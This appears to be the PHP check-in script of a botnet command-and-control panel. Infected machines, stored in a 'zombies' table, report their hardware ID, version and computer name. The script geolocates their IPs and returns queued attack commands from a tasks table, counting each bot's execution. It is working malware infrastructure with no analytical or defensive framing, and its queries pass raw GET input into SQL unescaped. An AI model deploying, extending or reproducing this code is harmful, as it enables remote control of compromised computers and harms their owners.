<?php
//Connection
require_once('inc/config.php');

//GeoIP
require_once('inc/geoip.php');

//GET
$hwid	  = $_GET['hwid'];
$version  = $_GET['version'];
$computer = $_GET['pc'];

//Normal
$install 	  = date('Y-m-d H:i:s');
$ip			  = $_SERVER['REMOTE_ADDR'];

// GeoIP
	$gi 	  = geoip_open('inc/GeoIP.dat',GEOIP_STANDARD);
	$code1 	  = geoip_country_code_by_addr($gi, $ip);
	$code2 	  = geoip_country_name_by_addr($gi, $ip);
	geoip_close($gi);
		
	$country  	   = strtolower($code1);
	$country_long  = strtolower($code2);
// GeoIP

	
//Exist
$e = mysql_query("SELECT * FROM zombies WHERE hwid LIKE '$hwid'");

if(!mysql_num_rows($e)){
	mysql_query("INSERT INTO zombies 
	  (country, countrylong, ip, version, install, pc, hwid) VALUES
	  ('$country', '$country_long', '$ip', '$version', '$install', '$computer', '$hwid')");
}else{
	mysql_query("UPDATE zombies Set status = '1',time = '$install' WHERE hwid LIKE '$hwid'");
}


//Multi tasking
	$time = time();
	
	$q1 = mysql_query("SELECT * FROM tasks");
	while($row = mysql_fetch_array($q1))
	{
		$time_out = $row['time'];
		$date_old = new DateTime($time_out);
		$date_new = $date_old->getTimestamp();
					
		if($date_new <= $time){		
			$command = $row['command'];
			
				$q2 = mysql_query("SELECT * FROM tasks WHERE command LIKE '$command'");
					while($row = mysql_fetch_array($q2))
					 {
						$done = $row['done'];
						$bots = $row['bots'];
						$add  = $done+1;
					 }
					  
					if($done != $bots){
						$q3    = "SELECT * FROM tasks_done WHERE hwid LIKE '$hwid' AND command LIKE '$command'";
						$count = mysql_query($q3);
				
						if(!mysql_num_rows($count)){								
							echo $command;
							
							mysql_query("UPDATE tasks Set done = '$add' WHERE command = '$command'");			
							mysql_query("INSERT INTO tasks_done 
									   (hwid, command) VALUES
									   ('$hwid', '$command')");
						}
					}					
		}
	}
?>